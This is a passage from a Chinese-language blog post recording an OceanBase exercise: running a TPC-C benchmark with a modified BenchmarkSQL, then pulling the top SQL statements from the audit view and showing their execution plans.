class="operator">+</span><span class="comment">-------+-------------------+-----------+--------------+----------+----------------+-----------------+----------------+-----------------+------------------+----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.011</span> sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="创建测试租户">创建测试租户</h3>
<p>新建一个规格单元、资源池，以及租户、数据库：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">create</span> resource unit</span><br><span class="line"><span class="keyword">create</span> resource unit tpcc_unit max_cpu<span class="operator">=</span><span class="number">1</span>, min_cpu<span class="operator">=</span><span class="number">1</span>, max_memory<span class="operator">=</span><span class="string">&#x27;2g&#x27;</span>, min_memory<span class="operator">=</span><span class="string">&#x27;2g&#x27;</span>, max_iops<span class="operator">=</span><span class="number">10000</span>, min_iops<span class="operator">=</span><span class="number">1000</span>, max_session_num<span class="operator">=</span><span class="number">1000</span>, max_disk_size<span class="operator">=</span><span class="string">&#x27;2g&#x27;</span>;</span><br><span class="line"></span><br><span class="line">#<span class="keyword">create</span> resource pool</span><br><span class="line"><span class="keyword">create</span> resource pool tpcc_pool unit <span class="operator">=</span> <span class="string">&#x27;tpcc_unit&#x27;</span>, unit_num <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">#<span class="keyword">create</span> tenant</span><br><span class="line"><span class="keyword">create</span> tenant tpcc resource_pool_list<span class="operator">=</span>(<span class="string">&#x27;tpcc_pool&#x27;</span>);</span><br><span class="line"></span><br><span class="line">#login tenant tpcc</span><br><span class="line">mysql <span class="operator">-</span>uroot<span class="variable">@tpcc</span> <span class="operator">-</span>h127<span class="number">.1</span> <span class="operator">-</span>P2881</span><br><span class="line"></span><br><span class="line">#<span class="keyword">create</span> schema tpcc</span><br><span class="line"><span class="keyword">create</span> database tpcc;</span><br></pre></td></tr></table></figure></div>
<h2 id="练习内容">练习内容</h2>
<ol>
<li>使用 BenchmarkSQL 运行 TPC-C ，并发数=5。</li>
<li>分析 TPC-C TOP SQL，并查看 3条 SQL 的 解析执行计划 和 实际执行计划。</li>
<li>使用 OceanBase 的 Outline 对 其中一条 SQL 进行限流（限制并发为 1 ）。</li>
</ol>
<h2 id="过程记录">过程记录</h2>
<h3 id="Practice-1-使用-BenchmarkSQL-运行-TPC-C">Practice 1: 使用 BenchmarkSQL 运行 TPC-C</h3>
<h4 id="改造-BenchmarkSQL-适配-OceanBase">改造 BenchmarkSQL 适配 OceanBase</h4>
<p>BenchmarkSQL 代码库：<a class="link"   href="https://sourceforge.net/projects/benchmarksql/" >https://sourceforge.net/projects/benchmarksql/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>说明：<br>
这份源码不适配OB，且需要编译。<br>
所以我根据官网的<a class="link"   href="https://open.oceanbase.com/docs/community/oceanbase-database/V3.1.0/test-the-tpc-c-of-apsaradb-for-oceanbase" >相关文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行了修改、编译，并上传到我的Gitee代码库：<br>
<a class="link"   href="https://gitee.com/shawnyan/benchmarksql4ob" >https://gitee.com/shawnyan/benchmarksql4ob <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>详细修改内容，可参考提交记录。</p>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220305-eadf4a4a-1962-4593-af12-1e69ba4d39d5.png"
                      referrerpolicy="no-referrer"
                >
<p>另注：</p>
<ol>
<li>修改过程中遇到了乱码问题，删掉了乱码注释。</li>
</ol>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220305-634e6ac4-aa98-4c06-ab3e-e3598a95c100.png"
                      referrerpolicy="no-referrer"
                >
<ol start="2">
<li>这里使用了 MariaDB Connector/J:</li>
</ol>
<p>1）下载最新版jar包</p>
<p><a class="link"   href="https://mariadb.com/kb/en/mariadb-connector-j-303-release-notes/" >https://mariadb.com/kb/en/mariadb-connector-j-303-release-notes/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>2）修改配置文件driver信息</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">db=oceanbase</span></span><br><span class="line"><span class="string">driver=org.mariadb.jdbc.Driver</span></span><br></pre></td></tr></table></figure></div>
<h4 id="使用-BenchmarkSQL-进行测试">使用 BenchmarkSQL 进行测试</h4>
<p>修改配置文件，确认数据库连接信息，以及测试压力参数：</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># conn info</span></span><br><span class="line"><span class="string">driver=org.mariadb.jdbc.Driver</span></span><br><span class="line"><span class="string">conn=jdbc:mysql://127.1:2881/tpcc?rewriteBatchedStatements=true&amp;allowMultiQueries=true&amp;useLocalSessionState=true&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;socketTimeout=30000000&amp;useSSL=false</span></span><br><span class="line"><span class="string">user=root@tpcc</span></span><br><span class="line"><span class="string">password=</span></span><br><span class="line"><span class="string">database=tpcc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># benchmark info</span></span><br><span class="line"><span class="string">warehouses=1</span></span><br><span class="line"><span class="string">loadWorkers=2</span></span><br><span class="line"><span class="string">terminals=5</span></span><br><span class="line"><span class="string">runMins=2</span></span><br></pre></td></tr></table></figure></div>
<p>构建测试数据：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./runDatabaseBuild.sh props.ob</span><br></pre></td></tr></table></figure></div>
<p>日志如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting BenchmarkSQL LoadData</span><br><span class="line"></span><br><span class="line">driver=org.mariadb.jdbc.Driver</span><br><span class="line">conn=jdbc:mysql://127.1:2881/tpcc?rewriteBatchedStatements=true&amp;allowMultiQueries=true&amp;useLocalSessionState=true&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;socketTimeout=30000000&amp;useSSL=false</span><br><span class="line">user=root@tpcc</span><br><span class="line">password=***********</span><br><span class="line">warehouses=1</span><br><span class="line">loadWorkers=2</span><br><span class="line">fileLocation (not defined)</span><br><span class="line">csvNullValue (not defined - using default &#x27;NULL&#x27;)</span><br><span class="line"></span><br><span class="line">Worker 000: Loading ITEM</span><br><span class="line">Worker 001: Loading Warehouse      1</span><br><span class="line">Worker 000: Loading ITEM done</span><br><span class="line">Worker 001: Loading Warehouse      1 done</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line"># Loading SQL file ./sql.common/indexCreates.sql</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line">create index bmsql_customer_idx1 on bmsql_customer (c_w_id, c_d_id, c_last, c_first) local;</span><br><span class="line">create index bmsql_oorder_idx1 on bmsql_oorder (o_w_id, o_d_id, o_carrier_id, o_id) local;</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line"># Loading SQL file ./sql.common/buildFinish.sql</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line">-- ----</span><br><span class="line">-- Extra commands to run after the tables are created, loaded,</span><br><span class="line">-- indexes built and extra&#x27;s created.</span><br><span class="line">-- ----</span><br></pre></td></tr></table></figure></div>
<p>运行压力测试：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./runBenchmark.sh props.ob</span><br></pre></td></tr></table></figure></div>
<p>输出日志如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ date; time ./runBenchmark.sh props.ob; date</span><br><span class="line">Fri Mar  4 15:15:23 JST 2022</span><br><span class="line">15:15:24,524 [main] INFO   jTPCC : Term-00,</span><br><span class="line">15:15:24,528 [main] INFO   jTPCC : Term-00, +-------------------------------------------------------------+</span><br><span class="line">15:15:24,528 [main] INFO   jTPCC : Term-00,      BenchmarkSQL v5.0</span><br><span class="line">15:15:24,528 [main] INFO   jTPCC : Term-00, +-------------------------------------------------------------+</span><br><span class="line">15:15:24,528 [main] INFO   jTPCC : Term-00,  (c) 2003, Raul Barbosa</span><br><span class="line">15:15:24,528 [main] INFO   jTPCC : Term-00,  (c) 2004-2016, Denis Lussier</span><br><span class="line">15:15:24,532 [main] INFO   jTPCC : Term-00,  (c) 2016, Jan Wieck</span><br><span class="line">15:15:24,533 [main] INFO   jTPCC : Term-00, +-------------------------------------------------------------+</span><br><span class="line">15:15:24,533 [main] INFO   jTPCC : Term-00,</span><br><span class="line">15:15:24,533 [main] INFO   jTPCC : Term-00, db=oceanbase</span><br><span class="line">15:15:24,533 [main] INFO   jTPCC : Term-00, driver=org.mariadb.jdbc.Driver</span><br><span class="line">15:15:24,533 [main] INFO   jTPCC : Term-00, conn=jdbc:mysql://127.1:2881/tpcc?rewriteBatchedStatements=true&amp;allowMultiQueries=true&amp;useLocalSessionState=true&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;socketTimeout=30000000&amp;useSSL=false</span><br><span class="line">15:15:24,533 [main] INFO   jTPCC : Term-00, user=root@tpcc</span><br><span class="line">15:15:24,533 [main] INFO   jTPCC : Term-00,</span><br><span class="line">15:15:24,533 [main] INFO   jTPCC : Term-00, warehouses=1</span><br><span class="line">15:15:24,533 [main] INFO   jTPCC : Term-00, terminals=5</span><br><span class="line">15:15:24,534 [main] INFO   jTPCC : Term-00, runMins=2</span><br><span class="line">15:15:24,534 [main] INFO   jTPCC : Term-00, limitTxnsPerMin=0</span><br><span class="line">15:15:24,535 [main] INFO   jTPCC : Term-00, terminalWarehouseFixed=true</span><br><span class="line">15:15:24,535 [main] INFO   jTPCC : Term-00,</span><br><span class="line">15:15:24,535 [main] INFO   jTPCC : Term-00, newOrderWeight=45</span><br><span class="line">15:15:24,535 [main] INFO   jTPCC : Term-00, paymentWeight=43</span><br><span class="line">15:15:24,535 [main] INFO   jTPCC : Term-00, orderStatusWeight=4</span><br><span class="line">15:15:24,535 [main] INFO   jTPCC : Term-00, deliveryWeight=4</span><br><span class="line">15:15:24,535 [main] INFO   jTPCC : Term-00, stockLevelWeight=4</span><br><span class="line">15:15:24,535 [main] INFO   jTPCC : Term-00,</span><br><span class="line">15:15:24,535 [main] INFO   jTPCC : Term-00, resultDirectory=my_result_%tY-%tm-%td_%tH%tM%tS</span><br><span class="line">15:15:24,535 [main] INFO   jTPCC : Term-00, osCollectorScript=./misc/os_collector_linux.py</span><br><span class="line">15:15:24,535 [main] INFO   jTPCC : Term-00,</span><br><span class="line">15:15:24,605 [main] INFO   jTPCC : Term-00, copied props.ob to my_result_2022-03-04_151524/run.properties</span><br><span class="line">15:15:24,605 [main] INFO   jTPCC : Term-00, created my_result_2022-03-04_151524/data/runInfo.csv for runID 3</span><br><span class="line">15:15:24,606 [main] INFO   jTPCC : Term-00, writing per transaction results to my_result_2022-03-04_151524/data/result.csv</span><br><span class="line">15:15:24,607 [main] INFO   jTPCC : Term-00, osCollectorScript=./misc/os_collector_linux.py</span><br><span class="line">15:15:24,607 [main] INFO   jTPCC : Term-00, osCollectorInterval=1</span><br><span class="line">15:15:24,608 [main] INFO   jTPCC : Term-00, osCollectorSSHAddr=null</span><br><span class="line">15:15:24,608 [main] INFO   jTPCC : Term-00, osCollectorDevices=null</span><br><span class="line">15:15:24,715 [main] INFO   jTPCC : Term-00,</span><br><span class="line">15:15:25,069 [main] INFO   jTPCC : Term-00, C value for C_LAST during load: 15</span><br><span class="line">15:15:25,069 [main] INFO   jTPCC : Term-00, C value for C_LAST this run:    115</span><br><span class="line">15:15:25,069 [main] INFO   jTPCC : Term-00,                                                                        Term-00, Running Average tpmTOTAL: 4934.50    Current tpmTOTAL: 65376    Memory Usage: 38MB / 203MB                      15:17:25,186 [Thread-1] INFO   jTPCC : Term-00,                                                           </span><br><span class="line">15:17:25,186 [Thread-1] INFO   jTPCC : Term-00,</span><br><span class="line">15:17:25,186 [Thread-1] INFO   jTPCC : Term-00, Measured tpmC (NewOrders) = 2224.33</span><br><span class="line">15:17:25,186 [Thread-1] INFO   jTPCC : Term-00, Measured tpmTOTAL = 4934.4</span><br><span class="line">15:17:25,186 [Thread-1] INFO   jTPCC : Term-00, Session Start     = 2022-03-04 15:15:25</span><br><span class="line">15:17:25,186 [Thread-1] INFO   jTPCC : Term-00, Session End       = 2022-03-04 15:17:25</span><br><span class="line">15:17:25,186 [Thread-1] INFO   jTPCC : Term-00, Transaction Count = 9873</span><br><span class="line"></span><br><span class="line">real    2m2.717s</span><br><span class="line">user    0m22.000s</span><br><span class="line">sys    0m11.070s</span><br><span class="line">Fri Mar  4 15:17:26 JST 2022</span><br></pre></td></tr></table></figure></div>
<h3 id="Practice-2-分析-TPC-C-TOP-SQL，并查看-3条-SQL-的解析执行计划和实际执行计划">Practice 2: 分析 TPC-C TOP SQL，并查看 3条 SQL 的解析执行计划和实际执行计划</h3>
<p>按SQL执行时间逆序排序，查询前5条的SQL_EXEC_ID，并依据ID查询具体的SQL语句:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> SQL_EXEC_ID, USER_NAME, USER_CLIENT_IP, DB_NAME, QUEUE_TIME, ELAPSED_TIME, PLAN_ID</span><br><span class="line"><span class="keyword">FROM</span> oceanbase.v$sql_audit</span><br><span class="line"><span class="keyword">WHERE</span> TENANT_ID <span class="operator">=</span> <span class="number">1001</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> QUEUE_TIME <span class="keyword">DESC</span></span><br><span class="line">LIMIT <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+----------------+---------+------------+--------------+---------+</span></span><br><span class="line"><span class="operator">|</span> SQL_EXEC_ID <span class="operator">|</span> USER_NAME <span class="operator">|</span> USER_CLIENT_IP <span class="operator">|</span> DB_NAME <span class="operator">|</span> QUEUE_TIME <span class="operator">|</span> ELAPSED_TIME <span class="operator">|</span> PLAN_ID <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+----------------+---------+------------+--------------+---------+</span></span><br><span class="line"><span class="operator">|</span>       <span class="number">67074</span> <span class="operator">|</span> root      <span class="operator">|</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>      <span class="operator">|</span> tpcc    <span class="operator">|</span>      <span class="number">27992</span> <span class="operator">|</span>        <span class="number">29698</span> <span class="operator">|</span>      <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       <span class="number">92863</span> <span class="operator">|</span> root      <span class="operator">|</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>      <span class="operator">|</span> tpcc    <span class="operator">|</span>      <span class="number">27955</span> <span class="operator">|</span>        <span class="number">28210</span> <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">166866</span> <span class="operator">|</span> root      <span class="operator">|</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>      <span class="operator">|</span> tpcc    <span class="operator">|</span>      <span class="number">23659</span> <span class="operator">|</span>        <span class="number">24209</span> <span class="operator">|</span>      <span class="number">40</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">164905</span> <span class="operator">|</span> root      <span class="operator">|</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>      <span class="operator">|</span> tpcc    <span class="operator">|</span>      <span class="number">22896</span> <span class="operator">|</span>        <span class="number">23053</span> <span class="operator">|</span>       <span class="number">8</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">170810</span> <span class="operator">|</span> root      <span class="operator">|</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>      <span class="operator">|</span> tpcc    <span class="operator">|</span>      <span class="number">22774</span> <span class="operator">|</span>        <span class="number">24642</span> <span class="operator">|</span>      <span class="number">33</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+----------------+---------+------------+--------------+---------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.151</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> QUERY_SQL</span><br><span class="line"><span class="keyword">FROM</span> v$sql_audit</span><br><span class="line"><span class="keyword">WHERE</span> SQL_EXEC_ID <span class="keyword">in</span> (<span class="number">67074</span>,<span class="number">92863</span>,<span class="number">166866</span>);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> QUERY_SQL                                                                                                                                                                                                                                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">SELECT</span> s_quantity, s_data,        s_dist_01, s_dist_02, s_dist_03, s_dist_04,        s_dist_05, s_dist_06, s_dist_07, s_dist_08,        s_dist_09, s_dist_10     <span class="keyword">FROM</span> bmsql_stock     <span class="keyword">WHERE</span> s_w_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> s_i_id <span class="operator">=</span> <span class="number">97058</span>     <span class="keyword">FOR</span> <span class="keyword">UPDATE</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">SELECT</span> d_name, d_street_1, d_street_2, d_city,        d_state, d_zip     <span class="keyword">FROM</span> bmsql_district     <span class="keyword">WHERE</span> d_w_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> d_id <span class="operator">=</span> <span class="number">7</span>                                                                                                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">SELECT</span> <span class="built_in">sum</span>(ol_amount) <span class="keyword">AS</span> sum_ol_amount     <span class="keyword">FROM</span> bmsql_order_line     <span class="keyword">WHERE</span> ol_w_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> ol_d_id <span class="operator">=</span> <span class="number">7</span> <span class="keyword">AND</span> ol_o_id <span class="operator">=</span> <span class="number">2572</span>                                                                                                                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.077</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h4 id="SQL-1">SQL 1</h4>
<p>解析执行计划:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(root<span class="variable">@127</span><span class="number">.1</span>) [tpcc] <span class="number">21</span>:<span class="number">19</span>:<span class="number">11</span><span class="operator">&gt;</span> EXPLAIN <span class="keyword">SELECT</span> s_quantity, s_data, s_dist_01, s_dist_02, s_dist_03, s_dist_04, s_dist_05, s_dist_06, s_dist_07, s_dist_08, s_dist_09, s_dist_10 <span class="keyword">FROM</span> bmsql_stock <span class="keyword">WHERE</span> s_w_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> s_i_id <span class="operator">=</span> <span class="number">97058</span>  <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR <span class="operator">|</span>NAME       <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST<span class="operator">|</span></span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span><span class="keyword">TABLE</span> <span class="keyword">GET</span><span class="operator">|</span>bmsql_stock<span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">54</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([bmsql_stock.s_quantity], [bmsql_stock.s_data], [bmsql_stock.s_dist_01], [bmsql_stock.s_dist_02], [bmsql_stock.s_dist_03], [bmsql_stock.s_dist_04], [bmsql_stock.s_dist_05], [bmsql_stock.s_dist_06], [bmsql_stock.s_dist_07], [bmsql_stock.s_dist_08], [bmsql_stock.s_dist_09], [bmsql_stock.s_dist_10]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([bmsql_stock.s_w_id], [bmsql_stock.s_i_id], [bmsql_stock.s_quantity], [bmsql_stock.s_data], [bmsql_stock.s_dist_01], [bmsql_stock.s_dist_02], [bmsql_stock.s_dist_03], [bmsql_stock.s_dist_04], [bmsql_stock.s_dist_05], [bmsql_stock.s_dist_06], [bmsql_stock.s_dist_07], [bmsql_stock.s_dist_08], [bmsql_stock.s_dist_09], [bmsql_stock.s_dist_10]), partitions(p1)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.002</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>实际执行计划:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> plan_id, plan_depth, plan_line_id, operator, name, <span class="keyword">rows</span>, cost, property</span><br><span class="line"><span class="keyword">FROM</span> oceanbase.gv$plan_cache_plan_explain</span><br><span class="line"><span class="keyword">WHERE</span> tenant_id<span class="operator">=</span><span class="number">1001</span> <span class="keyword">AND</span> ip <span class="operator">=</span> <span class="string">&#x27;127.0.0.1&#x27;</span> <span class="keyword">AND</span> port<span class="operator">=</span><span class="number">2882</span> <span class="keyword">AND</span> plan_id<span class="operator">=</span><span class="number">30</span>;</span><br></pre></td></tr></table></figure></div>
<h4 id="SQL-2">SQL 2</h4>
<p>解析执行计划:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(root<span class="variable">@127</span><span class="number">.1</span>) [tpcc] <span class="number">21</span>:<span class="number">19</span>:<span class="number">21</span><span class="operator">&gt;</span> EXPLAIN</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> d_name, d_street_1, d_street_2, d_city, d_state, d_zip</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> bmsql_district</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> d_w_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> d_id <span class="operator">=</span> <span class="number">7</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> \G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR <span class="operator">|</span>NAME          <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST<span class="operator">|</span></span><br><span class="line"><span class="comment">--------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span><span class="keyword">TABLE</span> <span class="keyword">GET</span><span class="operator">|</span>bmsql_district<span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">53</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([bmsql_district.d_name], 